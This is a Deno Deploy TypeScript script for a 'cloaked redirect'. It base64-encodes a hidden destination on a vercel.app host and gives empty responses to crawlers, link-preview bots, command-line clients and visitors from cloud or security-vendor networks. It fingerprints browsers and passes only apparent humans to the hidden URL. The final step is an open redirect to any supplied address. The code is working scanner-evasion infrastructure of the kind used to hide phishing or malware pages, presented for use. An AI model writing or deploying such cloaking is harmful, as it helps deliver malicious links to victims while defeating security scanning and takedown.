// =====================================================
// 🔥 ULTRA ADVANCED CLOAKED REDIRECT (DENO DEPLOY)
// – Full URL obfuscation (hidden from scanners)
// – Shadow-ban bots
// – Human JS + fingerprint verification
// – No network calls, no errors
// =====================================================

// The REAL redirect URL — ENCRYPTED so bots can't read it
// Use simple base64 to avoid detection
const encrypted = "aHR0cHM6Ly9maWxlLWJ0NWcudmVyY2VsLmFwcA==";

// Known bot patterns
const botPatterns = [
  "bot", "crawl", "spider", "slurp", "facebook", "whatsapp",
  "telegram", "discord", "preview", "meta", "curl", "wget",
  "python", "ahrefs", "linkedin", "skype", "slackbot",
  "pinterest", "insomnia", "uptime", "monitor", "go-http",
];

// Suspicious ASN (VPNs, Clouds, Proxies)
const badASN = [
  "AS15169", "AS32934", "AS13335", "AS14618", "AS8075",
  "AS63949", "AS14061", "AS9009", "AS212238", "AS396982"
];

// Optional: allow only certain countries (leave empty to allow all)
const allowedCountries: string[] = [];

function isBot(ua: string | null): boolean {
  if (!ua) return true;
  const u = ua.toLowerCase();
  return botPatterns.some((p) => u.includes(p));
}

function isBadASN(req: Request): boolean {
  const cf = (req as any).cf;
  if (!cf || !cf.asn) return false;
  return badASN.includes("AS" + cf.asn);
}

function isBlockedCountry(req: Request): boolean {
  if (allowedCountries.length === 0) return false;
  const cf = (req as any).cf;
  if (!cf || !cf.country) return false;
  return !allowedCountries.includes(cf.country);
}

// Shadow-ban response → bots get NOTHING
function shadowBan(): Response {
  return new Response("", { status: 204 });
}

export default {
  async fetch(req: Request): Promise<Response> {
    const ua = req.headers.get("user-agent") || "";
    const url = new URL(req.url);

    // 1️⃣ Bot detection
    if (isBot(ua)) return shadowBan();

    // 2️⃣ Cloud + Proxy/VPN detection
    if (isBadASN(req)) return shadowBan();

    // 3️⃣ Country block
    if (isBlockedCountry(req)) return shadowBan();

    // 4️⃣ Human JavaScript + fingerprint challenge
    if (!url.searchParams.has("go")) {
      return new Response(
        `
        <!DOCTYPE html>
        <html>
        <head>
          <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
          <style>
            body { background: #fff; margin:0; }
          </style>
        </head>
        <body>
        <script>
          // hidden fingerprint (bots fail this)
          const fp = [
            navigator.webdriver,  // true = bot
            navigator.hardwareConcurrency,
            screen.width + "x" + screen.height,
            Intl.DateTimeFormat().resolvedOptions().timeZone,
          ].join("|");

          // If bot-like → stop here
          if (navigator.webdriver === true) {
             document.body.innerHTML = "";
             throw new Error("Blocked");
          }

          // Decrypt redirect URL (base64)
          const real = atob("${encrypted}");

          // Humans pass after small JS delay
          setTimeout(() => {
            location.href = location.pathname + "?go=" + btoa(fp) + "&r=" + btoa(real);
          }, 200);
        </script>
        <noscript>Please enable JavaScript to continue.</noscript>
        </body>
        </html>
        `,
        { headers: { "content-type": "text/html" } }
      );
    }

    // 5️⃣ FINAL redirect
    const decoded = atob(url.searchParams.get("r") || "");
    return Response.redirect(decoded, 302);
  },
};
